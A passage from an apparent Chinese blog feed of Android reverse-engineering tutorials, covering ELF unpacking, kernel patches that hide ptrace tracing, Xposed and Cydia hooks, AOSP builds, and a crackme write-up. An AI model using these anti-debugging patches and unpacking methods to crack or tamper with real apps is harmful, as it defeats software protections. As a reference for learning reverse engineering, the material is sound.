flags) // so加载find_library(name);si-&gt;CallConstructors();CallFunction(&quot;DT_INIT&quot;, init_func); // so脱壳点CallArray(&quot;DT_INIT_ARRAY&quot;, init_array, init_array_count, false); // dex脱壳点</code></pre><p>加载 so 的时候，有两种加载方式，一个是直接 load，还有一个是 loadLibrary。无论是哪种方式，都会先获取 ClassLoader，然后再调用相应的方法。当传进来的 loader 不为空，则会调用 findLibrary 方法，然后执行 doLoad 方法，如果 loader 为空，则会执行另一个流程，但是后面也会执行 doLoad 方法。</p><h2 id="ELF-文件变形与保护（阻碍分析）"><a href="#ELF-文件变形与保护（阻碍分析）" class="headerlink" title="ELF 文件变形与保护（阻碍分析）"></a>ELF 文件变形与保护（阻碍分析）</h2><ul><li>Section 段处理：鉴于 Section Header 没有被 Linker 用于加载，所以可以对 Section 段写入无用数据，可以阻碍静态分析软件的分析。</li><li>Program 段处理：Program 段中可以对 DYNAMIC 区段进行混淆，添加重复的数据以及无效的数据。</li></ul><h1 id="so-文件加壳修复"><a href="#so-文件加壳修复" class="headerlink" title="so 文件加壳修复"></a>so 文件加壳修复</h1><pre><code class="bash">Program Headers:  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align  EXIDX          0x02867c 0x0002867c 0x0002867c 0x00568 0x00568 R   0x4  LOAD           0x000000 0x00000000 0x00000000 0x13294 0x13294 R E 0x8000  LOAD           0x018c10 0x00030c10 0x00030c10 0x0052c 0x01548 RW  0x8000  DYNAMIC        0x018c74 0x00030c74 0x00030c74 0x00108 0x00108 RW  0x4  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4  GNU_RELRO      0x018c10 0x00030c10 0x00030c10 0x003f0 0x003f0 R   0x1</code></pre><p>加过壳的标志：<code>FileSiz!=MemSiz</code>，明显存在加载后在内存进行解码的可能。函数地址也在文件之外。</p><p>修复：dump 内存，数据对齐重定位。</p><h1 id="Android-源码定制添加反反调试基址"><a href="#Android-源码定制添加反反调试基址" class="headerlink" title="Android 源码定制添加反反调试基址"></a>Android 源码定制添加反反调试基址</h1><p>反调试一般会检测 proc 下是否有 status/stat 文件。首先修改 kernel 源码中的 <code>fs/proc/base.c</code>。修改 proc_pid_wchan 函数的返回值：</p><pre><code class="cpp">static int proc_pid_wchan(struct task_struct *task, char *buffer){        unsigned long wchan;        char symname[KSYM_NAME_LEN];        wchan = get_wchan(task);        if (lookup_symbol_name(wchan, symname) &lt; 0)                if (!ptrace_may_access(task, PTRACE_MODE_READ))                        return 0;                else                        return sprintf(buffer, &quot;%lu&quot;, wchan);        else {                if (strstr(symname, &quot;trace&quot;)) { // 检测进程中是否有trace这个字符串                        return sprintf(buffer, &quot;%s&quot;, &quot;sys_epoll_wait&quot;); // sys_epoll_wait用来获取文件状态已经就绪的事件                }                return sprintf(buffer, &quot;%s&quot;, symname);        }}</code></pre><p>然后是 <code>fs/proc/array.c</code> 文件，分别修改 tast_state 函数和 task_state_array 变量：</p><pre><code class="cpp">static inline void task_state(struct seq_file *m, struct pid_namespace *ns,                                struct pid *pid, struct task_struct *p){        struct group_info *group_info;        int g;        struct fdtable *fdt = NULL;        const struct cred *cred;        pid_t ppid, tpid;        rcu_read_lock();        ppid = pid_alive(p) ?                task_tgid_nr_ns(rcu_dereference(p-&gt;real_parent), ns) : 0;        tpid = 0;        if (pid_alive(p)) {                struct task_struct *tracer = ptrace_parent(p);                if (tracer)                        tpid = task_pid_nr_ns(tracer, ns);        }        cred = get_task_cred(p);        seq_printf(m,                &quot;State:\t%s\n&quot;                &quot;Tgid:\t%d\n&quot;                &quot;Pid:\t%d\n&quot;                &quot;PPid:\t%d\n&quot;                &quot;TracerPid:\t%d\n&quot;                &quot;Uid:\t%d\t%d\t%d\t%d\n&quot;                &quot;Gid:\t%d\t%d\t%d\t%d\n&quot;,                get_task_state(p),                task_tgid_nr_ns(p, ns),                pid_nr_ns(pid, ns),                ppid, 0, // 把tpid修改为0                cred-&gt;uid, cred-&gt;euid, cred-&gt;suid, cred-&gt;fsuid,                cred-&gt;gid, cred-&gt;egid, cred-&gt;sgid, cred-&gt;fsgid);        task_lock(p);        if (p-&gt;files)                fdt = files_fdtable(p-&gt;files);        seq_printf(m,                &quot;FDSize:\t%d\n&quot;                &quot;Groups:\t&quot;,                fdt ? fdt-&gt;max_fds : 0);        rcu_read_unlock();        group_info = cred-&gt;group_info;        task_unlock(p);        for (g = 0; g &lt; min(group_info-&gt;ngroups, NGROUPS_SMALL); g++)                seq_printf(m, &quot;%d &quot;, GROUP_AT(group_info, g));        put_cred(cred);        seq_putc(m, &#39;\n&#39;);}static const char * const task_state_array[] = {        &quot;R (running)&quot;,          /*   0 */        &quot;S (sleeping)&quot;,         /*   1 */        &quot;D (disk sleep)&quot;,       /*   2 */        &quot;S (sleeping)&quot;,         // &quot;T (stopped)&quot;,          /*   4 */        &quot;S (sleeping)&quot;,         // &quot;t (tracing stop)&quot;,     /*   8 */        &quot;Z (zombie)&quot;,           /*  16 */        &quot;X (dead)&quot;,             /*  32 */        &quot;x (dead)&quot;,             /*  64 */        &quot;K (wakekill)&quot;,         /* 128 */        &quot;W (waking)&quot;,           /* 256 */};</code></pre><p>然后可以根据<a href="https://se8s0n.github.io/2019/04/19/%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87TracePID%E5%8F%8D%E8%B0%83%E8%AF%95%E4%BA%8C%E2%80%94%E2%80%94%E4%BB%8E%E6%BA%90%E7%A0%81%E5%85%A5%E6%89%8B/" target="_blank" rel="noopener">这篇文章</a>把 boot.img 重新打包并刷入手机。</p><h1 id="Refereences"><a href="#Refereences" class="headerlink" title="Refereences"></a>Refereences</h1><p><a href="https://www.bilibili.com/video/av45424886" target="_blank" rel="noopener">https://www.bilibili.com/video/av45424886</a><br><a href="https://www.jianshu.com/p/f7f0a712ddfe" target="_blank" rel="noopener">https://www.jianshu.com/p/f7f0a712ddfe</a><br><a href="https://source.android.com/devices/tech/dalvik/dex-format.html" target="_blank" rel="noopener">https://source.android.com/devices/tech/dalvik/dex-format.html</a><br><a href="https://www.jianshu.com/p/f7f0a712ddfe" target="_blank" rel="noopener">https://www.jianshu.com/p/f7f0a712ddfe</a><br><a href="http://gnaixx.cc/2016/11/26/20161126dex-file/" target="_blank" rel="noopener">http://gnaixx.cc/2016/11/26/20161126dex-file/</a><br><a href="https://www.cnblogs.com/stars-one/p/8890162.html" target="_blank" rel="noopener">https://www.cnblogs.com/stars-one/p/8890162.html</a><br><a href="http://shxi.me/posts/7b82cd68.html" target="_blank" rel="noopener">http://shxi.me/posts/7b82cd68.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android逆向入门（三）</title>
    <link href="/2020/02/12/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2020/02/12/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>记录 Jeb 插件编写、简单 Hook 以及 Android 系统结构简述。</p><a id="more"></a><h1 id="JEB-插件扩展"><a href="#JEB-插件扩展" class="headerlink" title="JEB 插件扩展"></a>JEB 插件扩展</h1><h2 id="插件帮助文件"><a href="#插件帮助文件" class="headerlink" title="插件帮助文件"></a>插件帮助文件</h2><pre><code>$JEB/doc/apidoc</code></pre><h2 id="插件编写"><a href="#插件编写" class="headerlink" title="插件编写"></a>插件编写</h2><p>语言：Java/Python</p><pre><code class="java">import jeb.api.IScript;public class decJebString implemants IScript {    private JebInstance jeb = null;    @Override    public void run(JebInstance jebInstance) {        jeb = jebInstance;        jeb.print(&quot;Hello World!!!&quot;);    }}</code></pre><p>强制反编译结果，相当于 Ctrl+F5：</p><pre><code class="java">import jeb.api.IScript;public class decJebString implemants IScript {    private static String targetSignature = &quot;Lcom/pnfsoftware/jebglobal/decStr;-&gt;decodeString([BII)Ljava/lang/String;&quot;;    private JebInstance jeb = null;    @Override    public void run(JebInstance jebInstance) {        jeb = jebInstance;        Dex dex = jeb.getDex();        List&lt;String&gt; classSignatures = dex.getClassSignatures(true);        int methodCount = dex.getMethodCount();        String methodSig;        for(int i = 0; i &lt; methodCount; i++) {            DexMethod dexMethod = dex.getMethod(i);            int idx = dexMethod.getIndex();            methodSig = dexMethod.getSignature(true);            if(methodSig.equals(targetSignature)) {                List&lt;Integer&gt; methodReferences = dex.getMethodReferences(idx); // 获取交叉引用                for(Integer refIdx : methodReferences) {                    DexMethod refDexMethod = dex.getMethod(refIdx);                    jeb.decompileMethod(refDexMethod.getSignature(true));                    ...                }            }        }        ...    }    ...}</code></pre><h1 id="Android-快速定位关键代码"><a href="#Android-快速定位关键代码" class="headerlink" title="Android 快速定位关键代码"></a>Android 快速定位关键代码</h1><ul><li>字符串、特征字</li><li>关键 API 监控</li><li>Hook 解密函数</li><li>Monitor</li><li>插 Log 信息<ul><li><code>invoke-static {v0}, Lcom/android/killer/Log;-&gt;LogStr(Ljava/lang/String;)V</code></li></ul></li><li>动态调试</li></ul><h1 id="快速-Hook-代码"><a href="#快速-Hook-代码" class="headerlink" title="快速 Hook 代码"></a>快速 Hook 代码</h1><p>对函数进行挂钩，可以影响整个函数的执行。挂钩后，注入的代码可以接管整个函数，修改函数的参数，返回值，甚至整个函数的行为等。</p><h2 id="Cydia-Substrate"><a href="#Cydia-Substrate" class="headerlink" title="Cydia Substrate"></a><a href="http://www.cydiasubstrate.com/" target="_blank" rel="noopener">Cydia Substrate</a></h2><p>只要知道类名就可以 Hook，而且属于系统全局属性，软件基本上不能检测到。</p><h3 id="Hook-Java"><a href="#Hook-Java" class="headerlink" title="Hook Java"></a>Hook Java</h3><ol><li>新建空项目</li><li>导入 lib 文件 substrate-api.jar</li><li>修改 AndroidManifest.xml 文件</li><li>编写入口类</li><li>安装激活插件，重启后可以看到插件效果</li></ol><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>修改 AndroidManifest.xml 文件：</p><pre><code class="xml">&lt;manifest&gt;    &lt;application&gt;        ...        &lt;meta-data android:name=&quot;com.saurik.substrate.main&quot; android:value=&quot;com.assassinq.cydiajavahook.CydiaMain&quot;/&gt;        ...    &lt;/application&gt;    &lt;uses-permission android:name=&quot;cydia.permission.SUBSTRATE&quot;/&gt;    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;&gt;&lt;/uses-permission&gt;&lt;/manifest&gt;</code></pre><p>编写入口类</p><pre><code class="java">package com.assassinq.cydiajavahook;import com.saurik.substrate.MS;import java.lang.reflect.Method;public class CydiaMain {    static void initialize() {        MS.hookClassLoad(&quot;android.content.res.Resources&quot;, new MS.ClassLoadHook() {            @Override            public void classLoaded(Class&lt;?&gt; resources) {                Method getColor;                try {                    getColor = resources.getDeclaredMethod(&quot;getColor&quot;, Integer.TYPE);                } catch (Exception e) {                    getColor = null;                }                if (getColor != null) {                    final MS.MethodPointer old = new MS.MethodPointer();                    MS.hookMethod(resources, getColor, new MS.MethodHook() {                        @Override                        public Object invoked(Object res, Object... args) throws Throwable {                            int color = (Integer) old.invoke(res, args);                            return color &amp; ~0xFFFFFF | 0x00AAAA;                        }                    }, old);                }            }        });    }}</code></pre><p>编写完成后，将程序安装到手机上，会弹出 Substrate extentions updated：</p><p><img src="/pics/Android逆向入门/三/1.png" srcset="/img/loading.gif" alt></p><p>点击进入 Cydia Substrate，点击 Restart System (Soft) 来重启系统：</p><p><img src="/pics/Android逆向入门/三/2.png" srcset="/img/loading.gif" alt></p><p>重启后发现系统某些部分的颜色已经被我们 Hook 成了其他颜色：</p><p><img src="/pics/Android逆向入门/三/3.png" srcset="/img/loading.gif" alt></p><p>在设置中打开更加明显：</p><p><img src="/pics/Android逆向入门/三/4.png" srcset="/img/loading.gif" alt></p><h4 id="Java-反射"><a href="#Java-反射" class="headerlink" title="Java 反射"></a>Java 反射</h4><p>Java 可以通过反射方法去获取类以及它的成员。反射相当于提供一些函数，让我们在不知道原始累的定义的情况下，去修改类中相关的成员的属性、值等。</p><p>所有类都是继承自 Object 类的，所以都可以使用 Object 的方法。也可以强制转换为 Object。所有，遇到无法表示出来的对象时，直接用 Object 即可。</p><p>获取对象的类：</p><pre><code class="java">Object obj = &quot;123&quot;;Class clazz = obj.getClass();</code></pre><p>获取类中的方法（使用对应的不是以 s 为后缀的函数可以获取特定的函数或 field）：</p><pre><code class="java">Method[] mPubMethods = clazz.getMethods(); // 获取公有可直接调用的方法Method[] mDeclareMethods = clazz.getDeclareMethods(); // 获取类中声明的所有方法Field[] mPubFields = clazz.getFields(); // 获取public的fieldField[] mDeclareFields = clazz.getDeclaredFields(); // 获取声明的所有field</code></pre><p>方法调用：</p><pre><code class="java">method.invoke(obj, arg)</code></pre><p>域操作：</p><pre><code class="java">field.set(obj, &quot;1&quot;);field.get(obj);</code></pre><p>访问权限设置（域与方法都一样，控制是否可以直接访问，其实就是相当于 public 属性）：</p><pre><code class="java">field.isAccessible();field.setAccessible(true);</code></pre><p>其余的函数，可以获取函数的名称，还有其他种种信息：</p><pre><code class="java">field.getName();field.toString();Class.forName(&quot;android.view.Menu&quot;); // 寻找类，必须是一个classloader下的才能使用</code></pre><h2 id="Xposed"><a href="#Xposed" class="headerlink" title="Xposed"></a>Xposed</h2><p>Xposed 是在程序启动的时候同时加载的，因此他的 Hook 是区分进程的。对于程序的类和参数可以通过名字来进行 Hook。Xposed 的 Hook 分为函数执行前和执行后两个位置，可以分别进行参数修改和结果修改。如果不想进行调用的话，可以在执行前使用 <code>setResult(NULL)</code> 函数。比起 Cydia 使用范围更加广泛，各种插件都是基于 Xposed 的，并且是开源的。</p><ol><li>新建基础项目</li><li>导入 lib 文件 XposedBridgeApi-54.jar（compileOnly 模式，也就是不参与编译到最终文件中）</li><li>修改 AndroidManifest.xml 文件</li><li>入口类编写</li><li>设置启动入口：在 assets 文件夹中，新建 xposed_init 文件，写入入口类的信息 com.assassinq.xposedjavahook.XposedMain</li><li>安装激活插件，重启后可以看到插件效果</li></ol><p>修改 app 下的 build.gradle 文件，将对应 lib/XposedBridgeApi-54.jar 的操作 implementation 修改成 compileOnly：</p><pre><code class="gradle">...dependencies {    ...    compileOnly files(&#39;lib/XposedBridgeApi-54.jar&#39;)}</code></pre><h3 id="Hook-Java-1"><a href="#Hook-Java-1" class="headerlink" title="Hook Java"></a>Hook Java</h3><p>修改 AndroidManifest.xml 文件：</p><pre><code class="xml">&lt;manifest&gt;    &lt;application&gt;        ...        &lt;meta-data android:name=&quot;xposedmodule&quot; android:value=&quot;true&quot;/&gt;        &lt;meta-data android:name=&quot;xposeddescription&quot; android:value=&quot;Hook getColor&quot;/&gt;        &lt;meta-data android:name=&quot;xposedminversion&quot; android:value=&quot;54&quot;/&gt;    &lt;/application&gt;    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;&gt;&lt;/uses-permission&gt;&lt;/manifest&gt;</code></pre><p>入口类编写，新建一个类文件：</p><pre><code class="java">public class XposedMain implements IXposedHookLoadPackage {    @Override    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam param) throws Throwable {//        if (param.packageName.equals(&quot;apk&quot;)) {            try {                findAndHookMethod(&quot;android.content.res.Resources&quot;, param.classLoader, &quot;getColor&quot;, int.class, new myGetColor());//                waitForDebugger();            } catch (Exception e) {                XposedBridge.log(e);            }//        }    }}class myGetColor extends XC_MethodHook {    @Override    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {        Log.d(&quot;DEBUG&quot;, &quot;Before Method Hook&quot;);    }    @Override    protected void afterHookedMethod(MethodHookParam param) throws Throwable {        Log.d(&quot;DEBUG&quot;, &quot;After Method Hook&quot;);        int res = (int) param.getResult();        res = res &amp; ~0xFFFFFF | 0x00AAAA;        param.setResult(res);    }}</code></pre><p>同样，编写完成后会弹出一个 Xposed module is not activated：</p><p><img src="/pics/Android逆向入门/三/5.png" srcset="/img/loading.gif" alt></p><p>点击后勾选我们编写的模块，并在 Framework 界面点击 Soft Reboot 以激活插件：</p><p><img src="/pics/Android逆向入门/三/6.png" srcset="/img/loading.gif" alt></p><p>重启后系统部分颜色同样被改变，但效果没有 Cydia 的好：</p><p><img src="/pics/Android逆向入门/三/7.png" srcset="/img/loading.gif" alt></p><h3 id="classLoader"><a href="#classLoader" class="headerlink" title="classLoader"></a>classLoader</h3><p>与 Java 上的类似，就是一个类装载器。与 Java 不同的是，classLoader 所加载的就是 dex 文件本身。所以通过程序的 classLoader，可以取得程序的 dex 中所定义的所有类及其成员函数。同理，如果一个程序有多个 dex，那么会对应着多个 classLoader，特别是使用动态加载的 dex，则需要传递想要的 classLoader 才可以进行数据获取。</p><h1 id="Android-源码浅析"><a href="#Android-源码浅析" class="headerlink" title="Android 源码浅析"></a>Android 源码浅析</h1><h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><p>Ubuntu 14.04</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>首先搭建好 JDK 6 的环境：</p><pre><code class="bash">cd &amp;&amp; wget https://repo.huaweicloud.com/java/jdk/6u45-b06/jdk-6u45-linux-x64.binchmod +x jdk-6u45-linux-x64.bin &amp;&amp; ./jdk-6u45-linux-x64.bincd /usr &amp;&amp; sudo mkdir javacd java &amp;&amp; sudo mv ~/jdk1.6.0_45 .vim ~/.bashrc# export JAVA_HOME=&quot;/usr/java/jdk1.6.0_45&quot;# export JRE_HOME=&quot;$JAVA_HOME/jre&quot;# export CLASSPATH=&quot;$CLASSPATH:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar&quot;# export PATH=&quot;$PATH:$JAVA_HOME/bin&quot;source ~/.bashrcjava -version</code></pre><p>然后安装一些编译时需要用到的依赖文件：</p><pre><code class="bash">sudo apt-get updatesudo apt-get install git-core gnupg flex bison gperf build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z-dev ccache libgl1-mesa-dev libxml2-utils xsltproc unzip</code></pre><p>添加 51-android.rules，使得手机 USB 连接到 Ubuntu 能够被识别：</p><pre><code class="bash">cd &amp;&amp; wget https://raw.githubusercontent.com/M0Rf30/android-udev-rules/master/51-android.rulessudo mv 51-android.rules /etc/udev/rules.d/sudo udevadm control --reload-rules</code></pre><p>接下来使用 repo 工具同步下载 Android 源码：</p><pre><code class="bash">cd &amp;&amp; mkdir bin # export PATH=&quot;$HOME/bin:$PATH&quot;curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo &gt; ~/bin/repo# curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repochmod a+x ~/bin/repoexport WORKING_DIRECTORY=&quot;android-4.4.3_r1&quot;mkdir $WORKING_DIRECTORY &amp;&amp; cd $WORKING_DIRECTORYgit config --global user.name &quot;Your Name&quot;git config --global user.email &quot;your@example.com&quot;# export REPO_URL=&quot;https://aosp.tuna.tsinghua.edu.cn/android/git-repo&quot;# vim ~/bin/repo # REPO_URL = &#39;https://aosp.tuna.tsinghua.edu.cn/android/git-repo&#39;repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-4.4.3_r1# repo init -u https://android.googlesource.com/platform/manifest -b android-4.4.3_r1repo sync # Takes a very long time# repo sync -c --no-clone-bundle --no-tags --prune -j4</code></pre><p>同步完成后进行编译：</p><pre><code class="bash">source build/envsetup.sh # Setup environmentlunch aosp_arm-eng # Setup choicesexport USE_CCACHE=1 # Enable ccacheprebuilts/misc/linux-x86/ccache/ccache -M 100G # Set ccache memory = 100G# export CCACHE_DIR=$YOUR_PATH/.ccache # Set ccache dir # Default in $HOME/.ccachemake -j4</code></pre><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>安装一下 Android Studio，用来作为查看源码的编辑器：</p><pre><code class="bash">sudo apt-get updatesudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386 lib32z1 libbz2-1.0:i386wget https://dl.google.com/dl/android/studio/ide-zips/3.5.3.0/android-studio-ide-191.6010548-linux.tar.gztar zxvf android-studio-ide-191.6010548-linux.tar.gzsudo mv android-studio /usr/localcd /usr/local/android-studio/bin./studio.sh</code></pre><p>PS：<a href="https://www.v2ex.com/t/455266" target="_blank" rel="noopener">谷歌在国内有服务器，用 ping.chinaz.com 解析出 dl.google.com 最快的 ip，在 hosts 里写死就行了，直接满速下载。</a></p><p>生成 Android Studio 文件：</p><pre><code class="bash">cd $HOME/$WORKING_DIRECTORY &amp;&amp; source build/envsetup.shlunch aosp_arm-engcd development/tools/idegen &amp;&amp; mmcd $HOME/$WORKING_DIRECTORY &amp;&amp; ./development/tools/idegen/idegen.sh</code></pre><p>运行完后，将根目录下的 android.ipr 导入 Android Studio 即可。目录结构：</p><table><thead><tr><th style="text-align:center">文件夹/文件</th><th style="text-align:center">包含内容</th></tr></thead><tbody><tr><td style="text-align:center">abi</td></tr><tr><td style="text-align:center">art</td><td style="text-align:center">art 模式相关的代码</td></tr><tr><td style="text-align:center">bionic</td><td style="text-align:center">各种 so 库的源代码</td></tr><tr><td style="text-align:center">bootable</td><td style="text-align:center">recovery、bootloader、diskinstaller</td></tr><tr><td style="text-align:center">build</td><td style="text-align:center">源码编译生成的规则代码</td></tr><tr><td style="text-align:center">cts</td><td style="text-align:center">Android 兼容性测试套件标准</td></tr><tr><td style="text-align:center">dalvik</td><td style="text-align:center">Dalvik 模式相关的代码</td></tr><tr><td style="text-align:center">developers</td><td style="text-align:center">一些开发上用来参考的资料</td></tr><tr><td style="text-align:center">development</td><td style="text-align:center">Android 开发相关的代码，makekey 等</td></tr><tr><td style="text-align:center">device</td><td style="text-align:center">手机驱动的源码</td></tr><tr><td style="text-align:center">docs</td><td style="text-align:center">doc 文档</td></tr><tr><td style="text-align:center">external</td><td style="text-align:center">Android 使用的一些开源的模块</td></tr><tr><td style="text-align:center">frameworks</td><td style="text-align:center">框架</td></tr><tr><td style="text-align:center">hardware</td><td style="text-align:center">部分开源的 HAL 代码</td></tr><tr><td style="text-align:center">libcore</td><td style="text-align:center">一些核心的 lib 文件库</td></tr><tr><td style="text-align:center">libnativehelper</td><td style="text-align:center">jni 相关的代码，包括如何通过 jni 来获取 Dalvik 中的某些函数</td></tr><tr><td style="text-align:center">Makefile</td></tr><tr><td style="text-align:center">ndk</td><td style="text-align:center">ndk 代码</td></tr><tr><td style="text-align:center">out</td></tr><tr><td style="text-align:center">packages</td><td style="text-align:center">应用程序源码</td></tr><tr><td style="text-align:center">pdk</td></tr><tr><td style="text-align:center">prebuilts</td><td style="text-align:center">镜像生成依赖的一些文件，如 gcc、kernel 等</td></tr><tr><td style="text-align:center">sdk</td><td style="text-align:center">sdk 源码，模拟器源码</td></tr><tr><td style="text-align:center">system</td><td style="text-align:center">底层文件系统库、应用及组件（C 语言）</td></tr><tr><td style="text-align:center">tools</td></tr></tbody></table><h2 id="内核代码"><a href="#内核代码" class="headerlink" title="内核代码"></a>内核代码</h2><p>编译内核代码</p><pre><code class="bash">git clone https://aosp.tuna.tsinghua.edu.cn/kernel/msm# git clone https://android.googlesource.com/kernel/msmcd msmgit branch -agit checkout remotes/origin/android-msm-hammerhead-3.4-kitkat-mr1sudo -i # 在root下进行编译export PATH=&quot;$PATH:$WORKING_DIRECTORY/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6/bin&quot;export ARCH=armexport SUBARCH=armexport CROSS_COMPILE=arm-eabi-make hammerhead_defconfigmake -j4</code></pre><p>完成后将输出的 zImage-dtb 文件覆盖到之前的安卓源码中。重新编译手机镜像：</p><pre><code class="bash">source build/envsetup.shlunch aosp_hammerhead-userdebugmake -j4</code></pre><p>刷机：</p><pre><code>adb reboot bootloaderfastboot -w flashall</code></pre><table><thead><tr><th style="text-align:center">编译命令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">m</td><td style="text-align:center">编译所有的模块</td></tr><tr><td style="text-align:center">mm</td><td style="text-align:center">编译当前目录下的模块，当前目录下要有 Android.mk 文件</td></tr><tr><td style="text-align:center">mmm</td><td style="text-align:center">编译指定路径下的模块，指定路径下要有 Android.mk 文件</td></tr><tr><td style="text-align:center">make snod</td><td style="text-align:center">部分编译完后，使用该命令来编译的结果整合到镜像中</td></tr></tbody></table><h2 id="使用-Docker-进行编译-Android-源码"><a href="#使用-Docker-进行编译-Android-源码" class="headerlink" title="使用 Docker 进行编译 Android 源码"></a>使用 Docker 进行编译 Android 源码</h2><p>源码编译的时候在不同环境中可能会有不同的问题，但在有了 docker 之后，环境的问题就可以很轻松地解决了。命令如下：</p><pre><code class="bash">cd &amp;&amp; mkdir buildexport AOSP_VOL=&quot;$HOME/build&quot;wget https://raw.githubusercontent.com/tiann/docker-aosp/master/tests/build-kitkat.sh # 连接不上的话改一下hostsbash build-kitkat.sh</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.bilibili.com/video/av45424886" target="_blank" rel="noopener">https://www.bilibili.com/video/av45424886</a><br><a href="https://source.android.com/setup?hl=en" target="_blank" rel="noopener">https://source.android.com/setup?hl=en</a><br><a href="https://jingyan.baidu.com/article/d621e8dae805272865913fa7.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/d621e8dae805272865913fa7.html</a><br><a href="https://www.cnblogs.com/yyangblog/archive/2011/03/02/1968880.html" target="_blank" rel="noopener">https://www.cnblogs.com/yyangblog/archive/2011/03/02/1968880.html</a><br><a href="https://blog.csdn.net/u012417380/article/details/72809141" target="_blank" rel="noopener">https://blog.csdn.net/u012417380/article/details/72809141</a><br><a href="https://blog.csdn.net/u012417380/article/details/73196722" target="_blank" rel="noopener">https://blog.csdn.net/u012417380/article/details/73196722</a><br><a href="https://blog.csdn.net/u012417380/article/details/73353670" target="_blank" rel="noopener">https://blog.csdn.net/u012417380/article/details/73353670</a><br><a href="https://blog.csdn.net/sergeycao/article/details/46459419" target="_blank" rel="noopener">https://blog.csdn.net/sergeycao/article/details/46459419</a><br><a href="https://www.jianshu.com/p/3bdf6e9f9dfe" target="_blank" rel="noopener">https://www.jianshu.com/p/3bdf6e9f9dfe</a><br><a href="http://shxi.me/posts/7b82cd68.html" target="_blank" rel="noopener">http://shxi.me/posts/7b82cd68.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020春节-吾爱破解解题领红包活动</title>
    <link href="/2020/02/11/%5BTODO%5D2020%E6%98%A5%E8%8A%82-%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E8%A7%A3%E9%A2%98%E9%A2%86%E7%BA%A2%E5%8C%85%E6%B4%BB%E5%8A%A8/"/>
    <url>/2020/02/11/%5BTODO%5D2020%E6%98%A5%E8%8A%82-%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E8%A7%A3%E9%A2%98%E9%A2%86%E7%BA%A2%E5%8C%85%E6%B4%BB%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<p>第二次参加领红包活动，这次有两题是 apk。</p><a id="more"></a><h1 id="【春节】解题领红包之一"><a href="#【春节】解题领红包之一" class="headerlink" title="【春节】解题领红包之一"></a>【春节】解题领红包之一</h1><p>公众号回复直接得到口令：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/1.jpg" srcset="/img/loading.gif" alt></p><h1 id="【春节】解题领红包之二"><a href="#【春节】解题领红包之二" class="headerlink" title="【春节】解题领红包之二"></a>【春节】解题领红包之二</h1><p>查壳发现有 ASPack 壳，直接上 ESP 定律把壳脱掉：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/2.png" srcset="/img/loading.gif" alt></p><p>然后用 OD 看一下 dump 下来的程序，先搜索字符串，可以看到输入正确后返回的字符串：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/3.png" srcset="/img/loading.gif" alt></p><p>然后定位到具体的函数位置，看下来感觉有点复杂，但大概可以看到涉及到了三个字符串，可以判断出是类似 MD5 的哈希摘要：</p><pre><code>00617D34   .  8D4D F0       LEA ECX,DWORD PTR SS:[EBP-0x10]00617D37   .  8B15 04786200 MOV EDX,DWORD PTR DS:[0x627804]   ;  dumped_.0062B6AC00617D3D   .  8B12          MOV EDX,DWORD PTR DS:[EDX]00617D3F   .  8D45 FC       LEA EAX,DWORD PTR SS:[EBP-0x4]00617D42   .  E8 597DE1FF   CALL dumped_.0042FAA000617D47   .  8B45 F0       MOV EAX,DWORD PTR SS:[EBP-0x10]00617D4A   .  BA B87E6100   MOV EDX,dumped_.00617EB8          ;  E7EE5F4653E31955CACC7CD68E2A783900617D4F   .  E8 A42DDFFF   CALL dumped_.0040AAF800617D54   .  0F9445 E7     SETE BYTE PTR SS:[EBP-0x19]00617D58   .  33C0          XOR EAX,EAX00617D5A   .  5A            POP EDX00617D5B   .  59            POP ECX00617D5C   .  59            POP ECX00617D5D   .  64:8910       MOV DWORD PTR FS:[EAX],EDX00617D60   .  68 757D6100   PUSH dumped_.00617D7500617D65   &gt;  8D45 F0       LEA EAX,DWORD PTR SS:[EBP-0x10]00617D68   .  E8 4F1FDFFF   CALL dumped_.00409CBC00617D6D   .  C3            RETN00617D6E   .- E9 6515DFFF   JMP dumped_.004092D800617D73   .^ EB F0         JMP SHORT dumped_.00617D6500617D75   .  807D E7 00    CMP BYTE PTR SS:[EBP-0x19],0x000617D79   .  74 57         JE SHORT dumped_.00617DD200617D7B   .  33C0          XOR EAX,EAX00617D7D   .  55            PUSH EBP00617D7E   .  68 CB7D6100   PUSH 